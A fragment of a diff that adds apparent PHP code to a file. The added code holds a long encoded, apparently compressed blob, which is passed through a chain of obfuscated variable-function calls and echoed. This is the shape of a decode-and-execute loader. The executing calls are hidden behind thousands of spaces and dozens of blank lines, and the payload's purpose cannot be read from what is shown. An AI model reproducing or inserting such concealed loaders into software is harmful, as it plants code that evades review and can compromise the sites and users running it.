$_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
